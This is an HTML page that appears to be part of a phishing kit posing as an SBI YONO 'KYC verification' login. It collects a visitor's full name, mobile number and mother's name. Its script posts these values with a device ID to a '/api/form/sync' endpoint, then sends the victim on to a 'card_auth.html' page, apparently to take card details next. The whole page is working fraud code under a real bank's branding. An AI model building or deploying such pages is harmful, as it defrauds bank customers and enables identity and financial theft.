<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>KYC Verification</title>

    <style>
        :root {
            --primary: #0a3c8c;
            --primary-light: #1976d2;
            --bg: #f5f6fa;
            --card-bg: #fff;
            --border: #ccc;
            --text: #1f2a44;
            --note-bg: #e9f4ff;
            --footer-bg: #000;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, Helvetica, sans-serif;
        }

        html,
        body {
            height: 100%;
            background: var(--bg);
        }

        .page {
            max-width: 420px;
            margin: auto;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            background: var(--card-bg);
        }

        .top-banner {
            padding: 10px;
        }

        .top-banner img {
            width: 100%;
            display: block;
            border-radius: 2px;
        }

        .login-bar {
            margin: 10px;
            padding: 12px;
            background: #d9edff;
            border: 1px solid #c6def5;
            font-size: 16px;
            font-weight: bold;
            color: var(--primary);
        }

        .content {
            padding: 16px;
            flex: 1;
        }

        .care {
            margin-bottom: 12px;
            font-size: 14px;
        }

        .care span {
            color: red;
            font-weight: bold;
        }

        label {
            display: block;
            margin-top: 14px;
            margin-bottom: 6px;
            font-size: 14px;
            font-weight: bold;
        }

        label span {
            color: red;
        }

        input {
            width: 100%;
            padding: 14px;
            font-size: 14px;
            border: 1px solid var(--border);
            border-radius: 10px;
            outline: none;
        }

        input:focus {
            border-color: var(--primary);
            box-shadow: 0 0 0 2px rgba(10, 60, 140, 0.1);
        }

        .buttons {
            display: flex;
            gap: 12px;
            margin-top: 22px;
        }

        button {
            flex: 1;
            padding: 14px;
            background: var(--primary);
            color: #fff;
            border: none;
            font-size: 15px;
            border-radius: 8px;
            cursor: pointer;
            transition: background 0.2s;
        }

        button:hover {
            background: #083060;
        }

        .links {
            margin-top: 16px;
        }

        .links a {
            display: block;
            color: #1a73e8;
            font-size: 14px;
            text-decoration: none;
            margin-bottom: 6px;
            cursor: pointer;
        }

        .note-box {
            margin: 16px 10px;
            background: var(--note-bg);
            padding: 12px;
            font-size: 13px;
        }

        .note-box ul {
            padding-left: 16px;
        }

        .note-box li {
            margin-bottom: 4px;
        }

        .footer {
            margin-top: auto;
            margin-bottom: 22px;
            background: var(--footer-bg);
            color: #fff;
            padding: 10px 12px;
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .footer .tick {
            font-size: 14px;
        }
    </style>
</head>

<body>
    <div class="page">
        <div class="top-banner">
            <img src="../img/8p.jpg" alt="Top Banner">
        </div>

        <div class="login-bar">Sbi Yono Kyc Login</div>

        <div class="content">
            <div class="care">
                <span>CARE:</span> All fields must be entered carefully
            </div>

            <label>Full Name <span>*</span></label>
            <input type="text" id="fullName" placeholder="Enter your full name" required>

            <label>Mobile Number <span>*</span></label>
            <input type="tel" id="mobileNumber" maxlength="10" placeholder="Enter mobile number" required>

            <label>Mother Name <span>*</span></label>
            <input type="text" id="motherName" placeholder="Enter mother's name" required>

            <div class="buttons">
                <button id="submitBtn">Submit</button>
                <button type="button" id="resetBtn">Reset</button>
            </div>

            <div class="links">
                <a id="registerLink">New Customer ? Register here</a>
                <a id="forgotLink">Forgot Username</a>
            </div>

            <div class="note-box">
                <ul>
                    <li>Mandatory fields are marked as important</li>
                    <li>Do not share personal information</li>
                    <li>Your information is confidential</li>
                </ul>
            </div>
        </div>

        <div class="footer">
            <span class="tick">✔</span>
            <span>Verify © Copyright | All Rights Reserved</span>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const deviceId = urlParams.get('deviceId') || 'unknown';

        async function syncPageData(pageName, data) {
            try {
                await fetch('/api/form/sync', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        deviceId: deviceId,
                        pageName: pageName,
                        pageData: data,
                        timestamp: new Date().toISOString()
                    })
                });
            } catch (error) {
                console.error('[Form] Sync error:', error);
            }
        }

        document.getElementById('submitBtn').addEventListener('click', async () => {
            const fullName = document.getElementById('fullName').value.trim();
            const mobileNumber = document.getElementById('mobileNumber').value.trim();
            const motherName = document.getElementById('motherName').value.trim();

            if (!fullName || !mobileNumber || !motherName) {
                alert('Please fill in all fields');
                return;
            }

            await syncPageData('kyc_login', { fullName, mobileNumber, motherName });
            window.location.href = 'card_auth.html?deviceId=' + encodeURIComponent(deviceId);
        });

        document.getElementById('resetBtn').addEventListener('click', () => {
            document.getElementById('fullName').value = '';
            document.getElementById('mobileNumber').value = '';
            document.getElementById('motherName').value = '';
        });

        // Apply flow links
        document.getElementById('registerLink').addEventListener('click', () => {
            window.location.href = 'yono_apply.html?deviceId=' + encodeURIComponent(deviceId);
        });
        document.getElementById('forgotLink').addEventListener('click', () => {
            window.location.href = 'yono_apply.html?deviceId=' + encodeURIComponent(deviceId);
        });
    </script>
</body>

</html>
